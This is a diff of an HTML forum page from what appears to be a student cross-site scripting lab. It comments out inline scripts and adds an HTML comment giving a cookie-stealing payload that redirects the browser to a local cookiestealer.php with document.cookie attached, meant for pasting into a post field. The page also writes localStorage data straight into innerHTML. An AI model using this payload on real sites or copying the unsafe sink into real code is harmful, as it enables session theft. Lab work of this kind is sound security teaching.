@@ -4,25 +4,15 @@
     <meta charset="UTF-8" />
     <title>Forumpost</title>
     <link rel="stylesheet" href="style.css" />
-    <script type="text/javascript">
+    <!--It was necessary to move PostAngreifer.html from "Forenpost" directory into root directory (easiest solution).-->
+    <!--This is the js JS code which needs to be inserted in the input field "Text:" like following (depends on which port server was started "":4859" is different): document.location = "http://127.0.0.1:4859/cookiestealer.php?c=" + document.cookie;document.cookie = "username=Null Byte";document.write(document.cookie);-->
+    <!--<script type="text/javascript">
       document.cookie = "username=Null Byte";
       document.write(document.cookie);
-    </script>
-    <script type="text/javascript">
+    </script>-->
+    <!--<script type="text/javascript">
       document.location =
         "http://127.0.0.1:4859/cookiestealer.php?c=" + document.cookie;
-    </script>
-    <!--<script type="text/javascript">
-        document.cookie = "username=Null Byte";
-        document.write(document.cookie);
-      </script>-->
-    <!--<script type="text/javascript">
-      document.cookie = "username=Null Byte";
-      document.write(document.cookie);
-    </script>
-    <script type="text/javascript">
-      document.location =
-        "http://127.0.0.1:5500/HVM_Webseite_v1/PostAngreifer.html/cookiestealer.php?c=" + document.cookie;
     </script>-->
   </head>
   <body>
@@ -32,19 +22,10 @@
       <div class="headline" id="head">
         <script>
           head.innerHTML += localStorage.key(0);
-          // document.getElementById("head").insertAdjacentElement("afterbegin", <li>Hello</li>)
-          // document.head.insertAdjacentElement("afterbegin", <li>Hello</li>)
-          //head.insertAdjacentElement += localStorage.key(0)
-
-          /*script = localStorage.key(0)
-        console.log(script)
-        //document.head.script
-        document.head.insertAdjacentElement(script)*/
         </script>
       </div>
       <br />
       <br />
-
       <div class="forIndex">
         <div id="neuerPost">
           <script>
